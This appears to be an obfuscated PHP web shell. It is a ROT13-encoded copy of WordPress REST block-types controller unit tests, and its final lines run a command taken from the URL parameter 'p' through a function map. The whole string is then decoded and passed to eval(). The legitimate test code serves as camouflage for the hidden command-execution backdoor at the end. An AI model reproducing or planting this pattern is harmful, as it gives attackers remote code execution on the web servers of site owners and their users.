		$guvf->nffregNeenlUnfXrl( 'ivrj_fglyr_unaqyrf', $cebcregvrf, 'fpurzn zhfg pbagnva ivrj_fglyr_unaqyrf' );
		$guvf->nffregNeenlUnfXrl( 'vf_qlanzvp', $cebcregvrf );
		// Qrcerpngrq cebcregvrf.
		$guvf->nffregNeenlUnfXrl( 'rqvgbe_fpevcg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fpevcg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ivrj_fpevcg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe_fglyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fglyr', $cebcregvrf );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$oybpx_anzr = 'snxr/grfg';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$ubbx_anzr = 'erfg_cercner_oybpx_glcr';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/oybpx-glcrf/' . $oybpx_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_oybpx_glcr_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/oybpx-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'gvgyr' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/oybpx-glcrf/snxr/grfg' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/oybpx-glcrf' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 47620
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/oybpx-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_oybpx_glcr_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 47620
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/oybpx-glcrf/snxr/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_oybpx_glcr_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 47620
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/oybpx-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_oybpx_glcr_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 47620
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/oybpx-glcrf/snxr/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_oybpx_glcr_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 47620
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$ertvfgel = arj JC_Oybpx_Glcr_Ertvfgel();
		$frggvatf = neenl(
			'vpba'            => 'grkg',
			'eraqre_pnyyonpx' => '__erghea_ahyy',
		);
		$ertvfgel->ertvfgre( 'snxr/yvar', $frggvatf );
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( 'snxr/yvar' );
		$raqcbvag   = arj JC_ERFG_Oybpx_Glcrf_Pbagebyyre();
		$erdhrfg    = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $oybpx_glcr, $erdhrfg );
		$guvf->purpx_oybpx_glcr_bowrpg( $oybpx_glcr, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		$ertvfgel = arj JC_Oybpx_Glcr_Ertvfgel();
		$frggvatf = neenl(
			'vpba'            => 'grkg',
			'eraqre_pnyyonpx' => '__erghea_ahyy',
		);
		$ertvfgel->ertvfgre( 'snxr/yvar', $frggvatf );
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( 'snxr/yvar' );
		$erdhrfg    = arj JC_ERFG_Erdhrfg();
		$raqcbvag   = arj JC_ERFG_Oybpx_Glcrf_Pbagebyyre();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'anzr' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $oybpx_glcr, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'anzr',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	/**
	 * Hgvy purpx oybpx glcr bowrpg ntnvafg.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 6.4.0 Nqqrq gur `oybpx_ubbxf` rkgen svryq.
	 *
	 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Fnzcyr oybpx glcr.
	 * @cnenz neenl         $qngn Qngn gb pbzcner ntnvafg.
	 * @cnenz neenl         $yvaxf Yvaxf gb pbzcner ntnva.
	 */
	cebgrpgrq shapgvba purpx_oybpx_glcr_bowrpg( $oybpx_glcr, $qngn, $yvaxf ) {
		// Grfg qngn.
		$guvf->nffregFnzr( $qngn['nggevohgrf'], $oybpx_glcr->trg_nggevohgrf() );
		$guvf->nffregFnzr( $qngn['vf_qlanzvp'], $oybpx_glcr->vf_qlanzvp() );

		$rkgen_svryqf = neenl(
			'ncv_irefvba',
			'anzr',
			'gvgyr',
			'pngrtbel',
			'cnerag',
			'naprfgbe',
			'nyybjrqOybpxf',
			'vpba',
			'qrfpevcgvba',
			'xrljbeqf',
			'grkgqbznva',
			'cebivqrf_pbagrkg',
			'hfrf_pbagrkg',
			'fryrpgbef',
			'fhccbegf',
			'fglyrf',
			'rknzcyr',
			'inevngvbaf',
			'oybpx_ubbxf',
			'rqvgbe_fpevcg_unaqyrf',
			'fpevcg_unaqyrf',
			'ivrj_fpevcg_unaqyrf',
			'ivrj_fpevcg_zbqhyr_vqf',
			'rqvgbe_fglyr_unaqyrf',
			'fglyr_unaqyrf',
			// Qrcerpngrq svryqf.
			'rqvgbe_fpevcg',
			'fpevcg',
			'ivrj_fpevcg',
			'rqvgbe_fglyr',
			'fglyr',
		);

		sbernpu ( $rkgen_svryqf nf $rkgen_svryq ) {
			vs ( vffrg( $oybpx_glcr->$rkgen_svryq ) ) {
				$guvf->nffregFnzr( $qngn[ $rkgen_svryq ], $oybpx_glcr->$rkgen_svryq );
			}
		}

		// Grfg yvaxf.
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/oybpx-glcrf' ), $yvaxf['pbyyrpgvba'][0]['uers'] );
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/oybpx-glcrf/' . $oybpx_glcr->anzr ), $yvaxf['frys'][0]['uers'] );
		vs ( $oybpx_glcr->vf_qlanzvp() ) {
			$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/eraqre-oybpx', $yvaxf );
		}
	}

	/**
	 * @gvpxrg 59969
	 */
	choyvp shapgvba grfg_inevngvba_pnyyonpx() {
		$oybpx_glcr = 'grfg/oybpx';
		$frggvatf   = neenl(
			'gvgyr'              => gehr,
			'inevngvba_pnyyonpx' => neenl( $guvf, 'zbpx_inevngvba_pnyyonpx' ),
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf( $guvf->zbpx_inevngvba_pnyyonpx(), $qngn['inevngvbaf'] );
	}

	/**
	 * Zbpx inevngvba pnyyonpx.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba zbpx_inevngvba_pnyyonpx() {
		erghea neenl(
			neenl( 'anzr' => 'ine1' ),
			neenl( 'anzr' => 'ine2' ),
		);
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur hcqngr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>